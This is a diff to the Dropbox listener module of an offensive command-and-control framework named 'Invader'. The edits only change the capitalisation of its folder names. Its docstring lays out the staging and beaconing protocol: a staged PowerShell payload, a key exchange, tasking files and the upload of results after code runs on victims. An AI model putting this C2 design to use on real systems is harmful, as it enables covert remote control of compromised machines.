@@ -9,7 +9,7 @@ import dropbox
 # from dropbox.files import FileMetadata, FolderMetadata, CreateFolderError
 from pydispatch import dispatcher
 
-# invader imports
+# Invader imports
 from lib.common import helpers
 from lib.common import agents
 from lib.common import encryption
@@ -58,7 +58,7 @@ class Listener:
             'BaseFolder' : {
                 'Description'   :   'The base Dropbox folder to use for comms.',
                 'Required'      :   True,
-                'Value'         :   '/invader/'
+                'Value'         :   '/Invader/'
             },
             'StagingFolder' : {
                 'Description'   :   'The nested Dropbox staging folder.',
@@ -753,7 +753,7 @@ def send_message(packets=None):
         Threaded function that actually starts up polling server for Dropbox
         polling communication.
 
-        ./invader/
+        ./Invader/
             ./staging/
                 payload.ps1
                 SESSION_[1-4].txt
@@ -762,39 +762,39 @@ def send_message(packets=None):
             ./results/
                 SESSIONID.txt
 
-        /invader/staging/payload.ps1       -> RC4staging(payload.ps1) uploaded by server
-        /invader/staging/sessionID_1.txt  -> AESstaging(PublicKey) uploaded by client
-        /invader/staging/sessionID_2.txt  -> RSA(nonce+AESsession) uploaded by server
-        /invader/staging/sessionID_3.txt  -> AESsession(nonce+sysinfo) uploaded by client
-        /invader/staging/sessionID_4.txt  -> AESsession(agent.ps1) uploaded by server
+        /Invader/staging/payload.ps1       -> RC4staging(payload.ps1) uploaded by server
+        /Invader/staging/sessionID_1.txt  -> AESstaging(PublicKey) uploaded by client
+        /Invader/staging/sessionID_2.txt  -> RSA(nonce+AESsession) uploaded by server
+        /Invader/staging/sessionID_3.txt  -> AESsession(nonce+sysinfo) uploaded by client
+        /Invader/staging/sessionID_4.txt  -> AESsession(agent.ps1) uploaded by server
 
 
         client                                              dropbox                             server
-                                                                                        <- upload /invader/staging/payload.ps1
-        read /invader/staging/payload                     ->
+                                                                                        <- upload /Invader/staging/payload.ps1
+        read /Invader/staging/payload                     ->
                                                         <-  return payload
         generate sessionID
-        upload /invader/staging/sessionID_1.txt          ->
-                                                                                        <- read /invader/staging/sessionID_1.txt
-                                                                                        <- upload /invader/staging/sessionID_2.txt
-        read /invader/staging/sessionID_2.txt            ->
-                                                        <- /invader/staging/sessionID_2.txt
-        upload /invader/staging/sessionID_3.txt          ->
-                                                                                        <- read /invader/staging/sessionID_3.txt
-                                                                                        <- upload /invader/staging/sessionID_4.txt
-        read /invader/staging/sessionID_4.txt            ->
-                                                        <- /invader/staging/sessionID_4.txt
+        upload /Invader/staging/sessionID_1.txt          ->
+                                                                                        <- read /Invader/staging/sessionID_1.txt
+                                                                                        <- upload /Invader/staging/sessionID_2.txt
+        read /Invader/staging/sessionID_2.txt            ->
+                                                        <- /Invader/staging/sessionID_2.txt
+        upload /Invader/staging/sessionID_3.txt          ->
+                                                                                        <- read /Invader/staging/sessionID_3.txt
+                                                                                        <- upload /Invader/staging/sessionID_4.txt
+        read /Invader/staging/sessionID_4.txt            ->
+                                                        <- /Invader/staging/sessionID_4.txt
 
         <start beaconing>
-                                                                                        <- upload /invader/taskings/sessionID.txt
-        read /invader/taskings/sessionID.txt             ->
-                                                        <- /invader/taskings/sessionID.txt
-        delete /invader/taskings/sessionID.txt           ->
+                                                                                        <- upload /Invader/taskings/sessionID.txt
+        read /Invader/taskings/sessionID.txt             ->
+                                                        <- /Invader/taskings/sessionID.txt
+        delete /Invader/taskings/sessionID.txt           ->
 
         execute code
-        upload /invader/results/sessionID.txt            ->
-                                                                                        <- read /invader/results/sessionID.txt
-                                                                                        <- delete /invader/results/sessionID.txt
+        upload /Invader/results/sessionID.txt            ->
+                                                                                        <- read /Invader/results/sessionID.txt
+                                                                                        <- delete /Invader/results/sessionID.txt
 
         """
 
@@ -911,7 +911,7 @@ def send_message(packets=None):
 
             time.sleep(int(pollInterval))
 
-            # search for anything in /invader/staging/*
+            # search for anything in /Invader/staging/*
             for match in dbx.files_search(stagingFolder, "*.txt").matches:
                 fileName = str(match.metadata.path_display)
                 relName = fileName.split('/')[-1][:-4]
